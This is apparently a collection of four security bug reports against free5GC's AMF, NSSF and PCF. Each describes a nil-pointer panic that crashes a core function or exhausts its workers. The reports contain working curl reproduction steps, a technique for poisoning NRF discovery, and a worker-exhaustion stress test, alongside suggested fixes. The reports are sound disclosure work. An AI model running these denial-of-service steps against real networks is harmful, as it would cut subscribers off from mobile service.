items.title: [Bugs] AMF namf-callback fatal crash on malformed old-AMF UEContextTransfer success (empty body)
items.body:
## Bug Decription

`POST /namf-callback/v1/n1-message-notify` can fatally crash `AMF` if the callback carries a `RegistrationRequest` with a 5G-GUTI from a different `GUAMI` and the discovered old `AMF` replies `200 OK` with an empty `UEContextTransfer` success body.

The callback worker feeds attacker-controlled NAS directly into registration handling:

```go
amf_nas.HandleNAS(ranUe, ngapType.ProcedureCodeInitialUEMessage, n1MessageNotify.BinaryDataN1Message, true)
```

When the NAS `RegistrationRequest` contains a 5G-GUTI from a different AMF (`cafe01` instead of local `cafe00`), `AMF` enters old-AMF context transfer:

```go
ueContextTransferRspData, pd, err := consumer.GetConsumer().UEContextTransferRequest(ue, anType, transferReason)
```

Inside `UEContextTransferRequest()`, a `200` downstream response is assumed to carry non-nil `JsonData`:

```go
ueContextTransferRspData = res.UeContextTransferResponse200.JsonData
logger.ConsumerLog.Debugf("UeContextTransferRspData: %+v", *ueContextTransferRspData)
```

If the old `AMF` returns:

```text
HTTP/2 200 OK
Content-Type: application/json

{}
```

then `res.UeContextTransferResponse200.JsonData == nil`, and `*ueContextTransferRspData` nil-dereferences.

Because this happens inside `N1MessageNotifyProcedure()`'s goroutine, the route-level recovery path uses:

```go
logger.CallbackLog.Fatalf("panic: %v\n%s", p, string(debug.Stack()))
```

so the `amf` process exits instead of merely returning `500`.

Relevant code:

- `NFs/amf/internal/sbi/processor/callback.go:292-296`
- `NFs/amf/internal/sbi/processor/callback.go:331`
- `NFs/amf/internal/gmm/handler.go:568`
- `NFs/amf/internal/gmm/handler.go:601`
- `NFs/amf/internal/sbi/consumer/amf_service.go:287-288`


## To Reproduce
Steps to reproduce the behavior:

1. Bring up a live `gNB`/`UE` so `AMF` has a real `RanNodeId` and `RanUeNgapID=1`.

2. Start a fake h2c old `AMF` on `10.100.200.1:18081` that returns:

```text
HTTP/2 200 OK
Content-Type: application/json

{}
```

for:

```text
POST /namf-comm/v1/ue-contexts/5g-guti-20893cafe0100000001/transfer
```

3. Poison old-AMF discovery so `GUAMI cafe01` resolves to that fake `namf-comm` service. In live validation this was done by modifying a stale `AMF` profile in `NRF` so:

- `amfInfo.guamiList[0].amfId = "cafe01"`
- `nfServices[namf-comm].apiPrefix = "http://10.100.200.1:18081"`

4. Send forged callback traffic to `POST /namf-callback/v1/n1-message-notify` with:

- live `ranNodeId` for the current gNB
- `anN2ApId = 1`
- valid `userLocation`
- `ueContext.supi = "imsi-208930000000001"`
- plain NAS `RegistrationRequest`
- `MobileIdentity5GS = 5g-guti 20893cafe0100000001`
- non-nil `UESecurityCapability`

5. Observe:

- fake old `AMF` receives the `UEContextTransfer` request
- `AMF` logs a fatal nil-pointer panic
- container exits with code `1`

## Expected Behavior

`AMF` should validate that a successful old-AMF `UEContextTransfer` response actually contains non-nil `JsonData` and `UeContext`. A malformed success body should become a controlled downstream error, never a fatal process exit.

## Screenshots
N/A

## Environment

- free5GC Version: `v4.2.1`
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.25.5 linux/amd64`

### Log File
 `amf` log :

```text
2026-03-26T01:59:56.879495284Z [INFO][AMF][Gmm] MobileIdentity5GS: GUTI[20893cafe0100000001]
2026-03-26T01:59:56.879506462Z [INFO][AMF][Gmm] Serving AMF has changed: guamiFromUeGuti[...] servedGuami[...]
2026-03-26T01:59:56.879515076Z [INFO][AMF][Gmm] ContextTransfer from old AMF[&{208 93 } cafe01]
2026-03-26T01:59:56.906658915Z [FATA][AMF][Callback] panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/amf/internal/sbi/consumer.(*namfService).UEContextTransferRequest
    /go/src/free5gc/NFs/amf/internal/sbi/consumer/amf_service.go:288 +0x4d2
github.com/free5gc/amf/internal/gmm.contextTransferFromOldAmf
    /go/src/free5gc/NFs/amf/internal/gmm/handler.go:601 +0x212
github.com/free5gc/amf/internal/sbi/processor.(*Processor).N1MessageNotifyProcedure.func1
    /go/src/free5gc/NFs/amf/internal/sbi/processor/callback.go:331 +0x356
```

Container state after trigger:

```text
status=exited running=false restart=0 exit=1
```

items.title: [Bugs] AMF panics with nil pointer dereference when AUSF omits Links["5g-aka"] from UE Authentication response
items.body:
## Summary

free5gc AMF's `SendAuth5gAkaConfirmRequest` function at `ausf_service.go:116` dereferences `confirmUri.Scheme` without checking whether `confirmUri` is nil. When the AUSF returns a UE Authentication response that omits `Links["5g-aka"]` (or when the Links map is nil/empty), `confirmUri` remains nil while `err` also remains nil, causing the code to enter the else-branch and panic on `confirmUri.Scheme` with a nil pointer dereference.

A malicious or compromised AUSF, or an attacker able to tamper with the N12 SBI response, can strip `Links["5g-aka"]` from the UE Authentication response. When the AMF later processes the UE's Authentication Response, `SendAuth5gAkaConfirmRequest` dereferences a nil `confirmUri`, causing the NGAP worker handling that UE to panic. Each trigger terminates one NGAP worker goroutine; the panic is recovered at the worker level so the AMF process initially survives, but the worker is not automatically restarted. Repeated triggers can progressively exhaust all available NGAP workers. Once all workers have exited, the AMF may become unable to process further NGAP tasks; in a stress test on a 96-core machine, exhausting all 96 workers was followed by AMF shutdown. The worker pool size defaults to `runtime.NumCPU()` (configurable via `ngapWorkerPoolSize`). At the observed rate of ~9 seconds per worker, a 4-worker deployment could exhaust in roughly 40 seconds and an 8-worker deployment in roughly 70–80 seconds, though actual time depends on deployment specifics and worker targeting.

The issue is in `NFs/amf/internal/sbi/consumer/ausf_service.go`, function `SendAuth5gAkaConfirmRequest` (line 104–117). The `SendEapAuthConfirmRequest` function (line 174–180) follows the same code pattern and appears to be affected by the same missing nil-check, though only the 5G-AKA path has been dynamically confirmed in this report.

## Environment

- **free5GC Version**: v4.2.2 (git tag), AMF binary built from commit `8b0f444` (2026-04-21), amfconfig Version 1.0.9
- **OS**: Ubuntu 20.04.6 LTS (Focal Fossa)
- **Kernel version**: 5.4.0-169-generic
- **go version**: go1.25.5 linux/amd64 (AMF binary), go1.26.2 (rebuilt AUSF for PoC)
- **C compiler version**: gcc 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)

## Affected component

- Component: free5gc AMF
- Area: SBI consumer — AUSF authentication confirmation
- Code path: `NFs/amf/internal/sbi/consumer/ausf_service.go`
- Functions: `SendAuth5gAkaConfirmRequest` (line 104–167), `SendEapAuthConfirmRequest` (line 169–226)
- Finding key: `nas5gs.authentication_failure.amf_context.ue_authentication_ctx.links.5g_aka.href.presence`
- Verification status: **dynamically confirmed** — full 5GC PoC reproduces the nil pointer panic in the AMF worker

## Root cause

### SendAuth5gAkaConfirmRequest (line 104–117)

```go
func (s *nausfService) SendAuth5gAkaConfirmRequest(ue *amf_context.AmfUe, resStar string) (
    *models.ConfirmationDataResponse, *models.ProblemDetails, error,
) {
    var ausfUri string
    var confirmUri *url.URL    // ← nil by default
    var err error              // ← nil by default

    // Only assigns confirmUri when Links["5g-aka"] is present and non-empty
    if len(ue.AuthenticationCtx.Links["5g-aka"]) > 0 {
        confirmUri, err = url.Parse(ue.AuthenticationCtx.Links["5g-aka"][0].Href)
    }
    // When Links["5g-aka"] is missing:
    //   - confirmUri stays nil
    //   - err stays nil
    //   - the if-err check below is FALSE
    //   - the else-branch dereferences nil.Scheme → PANIC

    if err != nil {
        return nil, nil, err     // ← err is nil, so we skip this
    } else {
        ausfUri = fmt.Sprintf("%s://%s", confirmUri.Scheme, confirmUri.Host)
        //                                  ^^^^^^^^^^^^^^^^
        //                                  nil pointer dereference → PANIC
    }

    client := s.getUEAuthenticationClient(ausfUri)
    // ...
```

The bug has two facets:

1. **Missing Links → nil dereference**: When `Links["5g-aka"]` is absent or has zero length, `confirmUri` stays nil. In Go, accessing `nil_map["key"]` returns the zero value (nil slice), and `len(nil)` returns 0, so neither condition triggers. The code falls through to dereference `confirmUri.Scheme` on nil.

2. **Nil Links map → same outcome**: A nil `Links` map behaves identically — `len(nil_map["5g-aka"])` returns 0, `confirmUri` stays nil, panic follows.

Both conditions were confirmed via unit tests and a full-5GC dynamic PoC.

### SendEapAuthConfirmRequest (line 174–180) — same pattern + additional error handling issue

```go
if len(ue.AuthenticationCtx.Links["eap-session"]) > 0 {
    confirmUri, err = url.Parse(ue.AuthenticationCtx.Links["eap-session"][0].Href)
}
if err != nil {
    logger.ConsumerLog.Errorf("url Parse failed: %+v", err)
    // ⚠️ Does NOT return — continues to dereference confirmUri below
}
ausfUri := fmt.Sprintf("%s://%s", confirmUri.Scheme, confirmUri.Host)
// Same nil dereference risk. Additionally, if url.Parse fails,
// confirmUri may be nil AND err is non-nil but not returned.
```

This function has the same nil-check pattern and an additional error-handling issue: when `url.Parse` fails, the error is logged but execution continues to the `fmt.Sprintf` line. This path has not been dynamically tested in this report, but static analysis indicates the same nil dereference risk.

## Dynamic verification

### Full 5GC PoC (primary evidence)

The vulnerability was reproduced in a complete free5gc deployment:

1. **AUSF patched**: The AUSF source (`ue_authentication.go:380-383`) was modified to omit `Links["5g-aka"]` from the UE Authentication response — simulating a malicious AUSF.
2. **AUSF rebuilt**: The AUSF binary was rebuilt from the patched source with `go1.26.2`.
3. **Full 5GC started**: NRF, AMF, UDM, patched AUSF, UDR, PCF, NSSF + CoreTesting gNB + state-learner UE.
4. **Registration flow driven**: The UE sent a Registration Request. The AMF forwarded the UE Authentication request to the AUSF. The patched AUSF returned a `201 Created` response **without** `Links["5g-aka"]`. The AMF received the Authentication Response from the UE and called `HandleAuthenticationResponse`, which invoked `SendAuth5gAkaConfirmRequest`.

### AMF log evidence

The AMF log confirms both that the code path was reached and that the nil pointer dereference occurred:

```text
2026-06-30T08:52:33.481203050Z Handle Authentication Response
2026-06-30T08:52:33.481271930Z Worker 1 panic: runtime error: invalid memory address or nil pointer dereference
```

The panic was caught by free5gc's NGAP worker pool recovery mechanism — the AMF process survived, but the worker goroutine handling the UE's NAS message was terminated abnormally.

### AUSF log evidence

The AUSF log confirms the UE Authentication request was processed and a `201` response was returned (without `Links["5g-aka"]`):

```text
2026-06-30T08:52:30.519201273Z Use 5G AKA auth method
2026-06-30T08:52:30.519281414Z | 201 | POST | /nausf-auth/v1/ue-authentications |
```

### Unit test evidence (secondary)

Go unit tests (`nil_pointer_crash_test.go`) directly call `SendAuth5gAkaConfirmRequest` with controlled `AuthenticationCtx.Links` state and recover from the panic. Three conditions tested:

| Test | Condition | Result |
|------|-----------|--------|
| `TestSendAuth5gAkaConfirmRequest_NilPointerPanic` | Links map empty (no `"5g-aka"` key) | PANIC at `ausf_service.go:116` |
| `TestSendAuth5gAkaConfirmRequest_NilLinksMap` | Links map nil | PANIC at `ausf_service.go:116` |
| `TestSendAuth5gAkaConfirmRequest_WithValidLink` | Links map has valid `"5g-aka"` entry | NO panic at line 116 |

### Worker pool exhaustion stress test (DoS confirmation)

A stress test was run to confirm that repeated attacks can exhaust the entire NGAP worker pool. The test repeatedly started a UE, drove the registration → authentication flow (triggering one worker panic per iteration), then killed and restarted the UE.

**Test environment**: 96 logical CPUs → `runtime.NumCPU()` → 96 workers. The stress test used UE identities (AMF-UE-NGAP-IDs RU:1 through RU:96) that mapped across all worker indexes.

| Metric | Value |
|--------|-------|
| Total iterations | 96 |
| Workers exhausted | 96 / 96 (**100%**) |
| Duration | ~14 minutes |
| Rate | ~9.2 seconds per worker |

Observed log sequence after the last worker panicked:

```text
2026-06-30T09:25:33 Worker 95 panic: nil pointer dereference
2026-06-30T09:25:42 Worker 0 panic:  nil pointer dereference   ← last worker
2026-06-30T09:25:50 All workers shut down successfully
2026-06-30T09:25:50 Close SCTP server...
2026-06-30T09:25:50 SCTP server closed
2026-06-30T09:25:50 AMF App is terminated
```

**Note**: The `All workers shut down successfully` / `AMF App is terminated` sequence follows from the AMF's graceful shutdown path (`ShutdownScheduler()`). While the stress test observed shutdown after worker exhaustion, the exact trigger (whether automatic upon all workers exiting, or from an external signal) should be distinguished from the worker-exhaustion condition itself. Regardless of whether shutdown is automatic, once all workers have exited, the scheduler has no live worker to consume tasks from worker channels, and the AMF can no longer process NGAP messages.

**Key observation**: Workers are consumed linearly with no protection — no panic threshold, no automatic worker replenishment, no circuit breaker. Each worker's `run()` loop uses `defer recover()` to catch panics and call `wg.Done()`, but does not restart the worker.

## Expected behavior

When the AMF receives an AUSF UE Authentication response, it should validate that `Links["5g-aka"]` (or `Links["eap-session"]`) is present **before** attempting to use its href value. If the link is missing:

1. `SendAuth5gAkaConfirmRequest` should return an error indicating that the AUSF response is malformed.
2. The AMF should handle this error gracefully — rejecting the authentication for that UE without panicking and without terminating the worker goroutine.

The AMF should not dereference a nil pointer recovered from an external NF's SBI response.

## Actual behavior

When the AUSF returns a UE Authentication response without `Links["5g-aka"]`:

1. `len(ue.AuthenticationCtx.Links["5g-aka"])` returns 0.
2. `confirmUri` remains nil, `err` remains nil.
3. The `if err != nil` check is false.
4. The else-branch executes `confirmUri.Scheme` → nil pointer dereference.
5. The NGAP worker goroutine panics. free5gc's worker pool catches the panic (the AMF process survives), but the worker terminates and the UE's authentication fails abnormally.

## Security impact

A malicious or compromised AUSF, or an attacker able to tamper with the AMF–AUSF SBI response, can omit `Links["5g-aka"]` from the UE Authentication response. When the AMF later processes the UE's Authentication Response, `SendAuth5gAkaConfirmRequest` dereferences a nil `confirmUri`, causing the NGAP worker handling that UE to panic.

Each successful trigger terminates one NGAP worker goroutine. The worker's panic is recovered at the worker level, so the AMF process may initially survive, but the worker is not automatically restarted. Repeated triggers can progressively reduce the available NGAP worker pool capacity. Once all workers have exited, the AMF may become unable to process further NGAP tasks; in the stress test, exhausting all 96 workers was followed by AMF shutdown.

Potential impacts:

- **Progressive NGAP worker exhaustion**: Each trigger terminates one worker with no automatic replenishment. The worker pool size defaults to `runtime.NumCPU()` (configurable via `ngapWorkerPoolSize`). At the observed rate of ~9 seconds per worker, a 4-worker deployment could be fully exhausted in roughly 40 seconds and an 8-worker deployment in roughly 70–80 seconds. Actual time depends on deployment specifics, UE restart speed, and whether the attacker can reliably target distinct worker indexes.
- **No protection mechanisms**: The worker pool has no panic threshold, no automatic worker replenishment, and no circuit breaker. Workers exit silently after `defer recover()` catches the panic, with no defensive response from the scheduler.
- **UE authentication disruption**: Each worker panic silently drops the affected UE's NAS connection. The UE receives no Reject message — the connection hangs until a timeout.
- **AMF service unavailability after exhaustion**: Once all workers have exited, no live goroutine remains to consume tasks from worker channels. New NGAP messages (InitialUEMessage, UplinkNASTransport, etc.) can no longer be processed, making the AMF effectively unavailable. In the stress test, the AMF entered shutdown after all workers were exhausted; whether shutdown is automatically triggered by worker exhaustion or requires an additional signal should be verified independently.
- **EAP-AKA' path appears similarly affected**: `SendEapAuthConfirmRequest` follows the same code pattern (missing nil-check, `url.Parse` errors logged but not returned), though only the 5G-AKA path has been dynamically confirmed in this report.
- **Compromised NF blast radius**: A single compromised AUSF should not be able to trigger worker panics that progressively disable the AMF. This missing input validation weakens the NF-to-NF resilience boundary.

This issue does not require a modified UE. It is an SBI-level defense-in-depth issue, but it does require either a malicious or compromised AUSF, or the ability to tamper with the AMF–AUSF SBI response.

## Suggested fix

### 1. Add nil check for confirmUri

```go
// In SendAuth5gAkaConfirmRequest, after the Links check and before using confirmUri:
if len(ue.AuthenticationCtx.Links["5g-aka"]) > 0 {
    confirmUri, err = url.Parse(ue.AuthenticationCtx.Links["5g-aka"][0].Href)
}
if err != nil {
    return nil, nil, err
}
// NEW: guard against missing Links
if confirmUri == nil {
    return nil, nil, fmt.Errorf(
        "missing Links[\"5g-aka\"] in AUSF UE Authentication response")
}
ausfUri = fmt.Sprintf("%s://%s", confirmUri.Scheme, confirmUri.Host)
```

### 2. Fix SendEapAuthConfirmRequest

Apply the same nil check, and additionally fix the error handling so that a `url.Parse` failure causes an early return:

```go
if len(ue.AuthenticationCtx.Links["eap-session"]) > 0 {
    confirmUri, err = url.Parse(ue.AuthenticationCtx.Links["eap-session"][0].Href)
}
if err != nil {
    // Fixed: return the error instead of just logging it
    return nil, nil, fmt.Errorf("url.Parse failed for eap-session href: %w", err)
}
if confirmUri == nil {
    return nil, nil, fmt.Errorf(
        "missing Links[\"eap-session\"] in AUSF UE Authentication response")
}
ausfUri := fmt.Sprintf("%s://%s", confirmUri.Scheme, confirmUri.Host)
```

### 3. Additional hardening

- Add regression tests:
  - `TestSendAuth5gAkaConfirm_RejectsMissingLinks` — empty Links map → expect error, not panic.
  - `TestSendAuth5gAkaConfirm_RejectsNilLinks` — nil Links map → expect error, not panic.
  - Same for `TestSendEapAuthConfirm_*`.
- Consider validating the entire AUSF UE Authentication response before storing it in the UE context, rejecting malformed responses at the point of ingestion rather than at the point of use.

items.title: [Bugs] NSSF `nnssf-nssaiavailability` `PUT /nssai-availability/{nfId}` panics when `supportedNssaiAvailabilityData` items omit `tai`
items.body:
## Bug Decription
`NSSF`'s `PUT /nnssf-nssaiavailability/v1/nssai-availability/{nfId}` handler can panic on authenticated input when an item in `supportedNssaiAvailabilityData` omits `tai`.

The current implementation iterates over `SupportedNssaiAvailabilityData` and directly dereferences:

```go
*s.Tai.PlmnId
```

without checking whether `s.Tai` or `s.Tai.PlmnId` is nil.

Relevant source evidence:

- route handler:
  - `NFs/nssf/internal/sbi/api_nssaiavailability.go:154`
  - `NFs/nssf/internal/sbi/api_nssaiavailability.go:194`
- nil-dereference sink:
  - `NFs/nssf/internal/sbi/processor/nssaiavailability_store.go:176`
  - `NFs/nssf/internal/sbi/processor/nssaiavailability_store.go:177`

Local Docker validation on March 20, 2026 confirmed the crash path:

1. obtain a valid `nnssf-nssaiavailability` token
2. send `PUT /nnssf-nssaiavailability/v1/nssai-availability/{nfId}`
3. use a body where `supportedNssaiAvailabilityData[0]` contains `supportedSnssaiList` but omits `tai`
4. `NSSF` returns `500`
5. `nssf` logs show a nil-pointer panic in `NssaiAvailabilityNfInstanceUpdate`

In this lab the process stayed alive because Gin recovery converted the panic into `500`, but the endpoint is still remotely crashable by authenticated network input and can be repeatedly abused to flood logs and deny the NSSAI-availability update path.

## To Reproduce
Steps to reproduce the behavior:

1. Obtain a valid `nnssf-nssaiavailability` token:

```bash
curl -sS -X POST http://10.100.200.3:8000/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=AMF&nfInstanceId=e282608b-65d7-4b03-a40a-3b390177af67&targetNfType=NSSF&scope=nnssf-nssaiavailability'
```

2. Send an authenticated `PUT` with `tai` omitted:

```bash
curl -i -X PUT \
  'http://10.100.200.8:8000/nnssf-nssaiavailability/v1/nssai-availability/e282608b-65d7-4b03-a40a-3b390177af67' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <valid_nnssf_nssaiavailability_jwt>' \
  --data '{"supportedNssaiAvailabilityData":[{"supportedSnssaiList":[{"sst":1,"sd":"010203"}]}]}'
```

3. Observe `HTTP/1.1 500 Internal Server Error`.
4. Inspect `nssf` logs and confirm the nil-pointer panic shown below.

## Expected Behavior
`NSSF` should reject incomplete `supportedNssaiAvailabilityData` items with a controlled `400 Bad Request`, not panic.

Expected behavior:

- missing `tai` should produce a controlled validation error
- `NssaiAvailabilityNfInstanceUpdate` should not dereference a nil `Tai`
- malformed authenticated input should not generate a panic or stack trace

## Screenshots
N/A

## Environment
- free5GC Version: `v4.2.1`
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.25.5 linux/amd64`
- Runtime image: `free5gc/nssf:v4.2.1`
- Runtime NSSF commit hash: `d56f9ed1`
- Validation date: `2026-03-20`
- Runtime SBI endpoint: `10.100.200.8:8000`

### Log File
Relevant `docker logs --tail 150 nssf` excerpt:

```text
2026-03-19T20:04:17.088043176Z [INFO][NSSF][NssaiAvail] Handle NSSAIAvailabilityPut
2026-03-19T20:04:17.098202796Z [ERRO][NSSF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/nssf/internal/sbi/processor.(*Processor).NssaiAvailabilityNfInstanceUpdate
    /go/src/free5gc/NFs/nssf/internal/sbi/processor/nssaiavailability_store.go:177 +0x118
github.com/free5gc/nssf/internal/sbi.(*Server).NSSAIAvailabilityPut
    /go/src/free5gc/NFs/nssf/internal/sbi/api_nssaiavailability.go:194 +0x315
2026-03-19T20:04:17.098330088Z [INFO][NSSF][GIN] | 500 |    10.100.200.1 | PUT | /nnssf-nssaiavailability/v1/nssai-availability/e282608b-65d7-4b03-a40a-3b390177af67 |  |
```

items.title: [Bugs] PCF app-session delete nil smPolicy panic
items.body:
## Bug Decription
`PCF` `POST /npcf-policyauthorization/v1/app-sessions/{appSessionId}/delete` panics with `runtime error: invalid memory address or nil pointer dereference` inside `HandleDeleteAppSessionContext` whenever the AF/NEF tries to delete an **AppSession that was previously created via the `bdtRefId`-only "BDT policy indication" path**.

The create handler `postAppSessCtxProcedure` has two distinct exit branches:

1. **BDT-only path** (`ascReqData.BdtRefId != ""`, line 168) — stores the AppSession with `appSessId = "BdtRefId-<uuid>"` and returns 201 immediately. The stored `pcf_context.AppSessionData` only fills `AppSessionId` and `AppSessionContext`; `SmPolicyData` is left **nil** (lines 173-178):

   ```go
   data := pcf_context.AppSessionData{
       AppSessionId:      appSessID,
       AppSessionContext: appSessCtx,
       // SmPolicyData NOT set
   }
   pcfSelf.AppSessionPool.Store(appSessID, &data)
   ```

2. **Session-binding path** (line 192 onwards) — runs `pcfSelf.SessionBinding(ascReqData)`, which finds an active SmPolicy for the supplied UE-IP and stores it on `data.SmPolicyData`.

`HandleDeleteAppSessionContext` is shared by both paths but unconditionally dereferences `appSession.SmPolicyData` and several of its sub-fields:

```go
// internal/sbi/processor/policyauthorization.go (deployed v4.2.2 — PCF v1.4.3 line numbers,
//                                                identical at upstream master commit df6c0da)
func (p *Processor) HandleDeleteAppSessionContext(
    c *gin.Context,
    appSessionId string,
    eventsSubscReqData *models.PcfPolicyAuthorizationEventsSubscReqData,
) {
    ...
    appSession := /* loaded from AppSessionPool */
    ...
    smPolicy := appSession.SmPolicyData                                     // line 471 — nil for BDT-only path
    deletedSmPolicyDec := models.SmPolicyDecision{}
    for _, pccRuleID := range appSession.RelatedPccRuleIds {
        if err := smPolicy.RemovePccRule(pccRuleID, &deletedSmPolicyDec); err != nil { ... }  // unreached: range is empty
    }
    delete(smPolicy.AppSessions, appSessionId)                              // <-- 479: nil deref panic
    pcfSelf.AppSessionPool.Delete(appSessionId)
    smPolicy.ArrangeExistEventSubscription()                                // <-- 497: same
    smPolicyID := fmt.Sprintf("%s-%d",
        smPolicy.PcfUe.Supi, smPolicy.PolicyContext.PduSessionId)           // <-- 500: chained derefs (4-level)
    ...
    go p.SendSMPolicyUpdateNotification(
        smPolicy.PolicyContext.NotificationUri, &notification)              // <-- 505: nil deref into goroutine
}
```

The first reachable panic is at line 479 (`smPolicy.AppSessions` field access on a nil receiver). If that line were guarded, lines 497, 500 and 505 would each panic in turn — line 505's panic is **inside a fresh goroutine spawned with `go`**, which has no `defer recover()`, so once line 479 is fixed the same delete request would still tear down the **entire BSF/PCF process** via the unrecovered goroutine panic. Both classes of failure deserve to be fixed together.

This is **distinct from**:
- The `policyauthorization.go:1156` `bdtData := resp.BdtData` panic — that one is on the **create** path with a missing `bdtRefId`, not the delete path.
- The `smpolicy.go:692` `*smPolicy.RemainGbrDL` panic — different SBI, different field.

The same delete handler is **unfixed at the latest upstream master commit `df6c0da`** (no `appSession.SmPolicyData == nil` guard added). Symmetric panic candidates at lines 497, 500, 505 are also unfixed.

## To Reproduce
Steps to reproduce the behaviour:

1. Run free5GC `v4.2.2` Docker deployment with NRF at `10.100.200.4:8000`, PCF at `10.100.200.3:8000`, UDR reachable, OAuth enabled.

2. Obtain `npcf-bdtpolicycontrol` and `npcf-policyauthorization` access tokens (the lab AMF instance ID works for both):

```bash
BDT_TOKEN=$(curl -s -X POST 'http://10.100.200.4:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=client_credentials' \
  --data-urlencode 'nfType=AMF' \
  --data-urlencode 'nfInstanceId=09c2c82b-4ed5-43df-b0fc-c7098d1fa5a0' \
  --data-urlencode 'targetNfType=PCF' \
  --data-urlencode 'scope=npcf-bdtpolicycontrol' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')

PA_TOKEN=$(curl -s -X POST 'http://10.100.200.4:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=client_credentials' \
  --data-urlencode 'nfType=AMF' \
  --data-urlencode 'nfInstanceId=09c2c82b-4ed5-43df-b0fc-c7098d1fa5a0' \
  --data-urlencode 'targetNfType=PCF' \
  --data-urlencode 'scope=npcf-policyauthorization' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
```

3. Provision a BDT policy so a valid `bdtRefId` exists in UDR (PCF will write it for you):

```bash
BDTREF=$(curl -s -X POST 'http://10.100.200.3:8000/npcf-bdtpolicycontrol/v1/bdtpolicies' \
  -H "Authorization: Bearer $BDT_TOKEN" -H 'Content-Type: application/json' \
  --data '{"aspId":"asp1","desTimeInt":{"startTime":"2026-04-26T00:00:00Z","stopTime":"2026-05-26T00:00:00Z"},"numOfUes":1,"volPerUe":{"totalVolume":1024}}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["bdtPolData"]["bdtRefId"])')
echo "bdtRefId = $BDTREF"
```

4. Create an AppSession via the BDT-only path (no `ueIpv4` / `ueIpv6` / `ueMac`):

```bash
curl -s -i -X POST 'http://10.100.200.3:8000/npcf-policyauthorization/v1/app-sessions' \
  -H "Authorization: Bearer $PA_TOKEN" -H 'Content-Type: application/json' \
  --data "{\"ascReqData\":{\"notifUri\":\"http://10.0.0.1/notif\",\"suppFeat\":\"0\",\"bdtRefId\":\"$BDTREF\"}}"
# 201 Created. Location: /npcf-policyauthorization/v1/app-sessions/BdtRefId-$BDTREF
```

5. Delete it:

```bash
curl -i -X POST "http://10.100.200.3:8000/npcf-policyauthorization/v1/app-sessions/BdtRefId-${BDTREF}/delete" \
  -H "Authorization: Bearer $PA_TOKEN" -H 'Content-Type: application/json' \
  --data '{}'
```

6. PCF returns `HTTP/1.1 500 Internal Server Error` (Gin recovery). `docker logs pcf` shows:

```text
[INFO][PCF][PolAuth] Handle Del AppSessions, AppSessionId[BdtRefId-03097607-8db6-4f02-aaba-8aa915128dfc]
[ERRO][PCF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/pcf/internal/sbi/processor.(*Processor).HandleDeleteAppSessionContext(0xc0002d08e0, 0xc0005fc900, ...)
        /go/src/free5gc/NFs/pcf/internal/sbi/processor/policyauthorization.go:479 +0x3d4
github.com/free5gc/pcf/internal/sbi.(*Server).HTTPDeleteAppSession(0xc00040d960, 0xc0005fc900)
        /go/src/free5gc/NFs/pcf/internal/sbi/api_policyauthorization.go:238 +0x54f
[INFO][PCF][GIN] | 500 |    10.100.200.1 | POST    | /npcf-policyauthorization/v1/app-sessions/BdtRefId-...../delete |  |
```

Each subsequent delete reproduces the panic; PCF keeps running because Gin's `defer recover()` catches it, but every request leaves a stack trace and the AppSession is never cleaned up — usable as a per-request DoS / log-volume amplification, **and** a state leak (the AppSession entry remains in `AppSessionPool` after the failed delete because `pcfSelf.AppSessionPool.Delete` at line 495 is unreachable).

If a future fix only adds a nil-guard to line 479, lines 497, 500, 505 still panic. Line 505's panic happens inside a **goroutine spawned without panic recovery** (`go p.SendSMPolicyUpdateNotification(smPolicy.PolicyContext.NotificationUri, ...)`), so a partial fix turns a per-request 500 into a process-fatal crash DoS.

## Expected Behavior
Reject the delete with a controlled `400 / 403` `ProblemDetails` for BDT-only AppSessions, or take the BDT-only branch in the delete handler (no PCC rule cleanup, no SM Policy notification — just `AppSessionPool.Delete(appSessionId)` and `204 No Content`):

```go
smPolicy := appSession.SmPolicyData
if smPolicy == nil {
    // BDT-only AppSession — nothing to undo on the SM side
    pcfSelf.AppSessionPool.Delete(appSessionId)
    c.Status(http.StatusNoContent)
    return
}
// ... existing PCC-rule cleanup path
```

The same nil-guard pattern should also wrap the goroutine at line 505 (`SendSMPolicyUpdateNotification`) — or at minimum, the goroutine should `defer recover()` so a future regression cannot tear down the PCF process.

## Environment
- free5GC Version: `v4.2.2`
- PCF binary: `free5gc/pcf:v4.2.2` (PCF release tag `v1.4.3`). The same `policyauthorization.go:479` (and the further unreachable derefs at 497/500/505) is **unfixed at the latest upstream master commit `df6c0da`** (no `appSession.SmPolicyData == nil` guard added in `HandleDeleteAppSessionContext`).
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.25.5 linux/amd64` (build toolchain; runtime: `free5gc/pcf:v4.2.2` Docker image)
- Validation date: `2026-04-27`
- Deployment: Docker-based lab on the internal SBI network `10.100.200.0/24`. PCF `10.100.200.3`, NRF `10.100.200.4`, UDR `10.100.200.x`.

### Log File
Representative panic trace from the validated reproduction:

```text
2026-04-27T03:31:20.630849612Z [INFO][PCF][PolAuth] Handle Del AppSessions, AppSessionId[BdtRefId-03097607-8db6-4f02-aaba-8aa915128dfc]
2026-04-27T03:31:20.630861464Z [WARN][PCF][PolAuth] Delete AppSessions does not support with Event Subscription
2026-04-27T03:31:20.630936063Z [ERRO][PCF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
goroutine 13010 [running]:
github.com/free5gc/pcf/internal/sbi/processor.(*Processor).HandleDeleteAppSessionContext(0xc0002d08e0, 0xc0005fc900, {0xc00013f83f, 0x2d}, 0xc0002b5400)
        /go/src/free5gc/NFs/pcf/internal/sbi/processor/policyauthorization.go:479 +0x3d4
github.com/free5gc/pcf/internal/sbi.(*Server).HTTPDeleteAppSession(0xc00040d960, 0xc0005fc900)
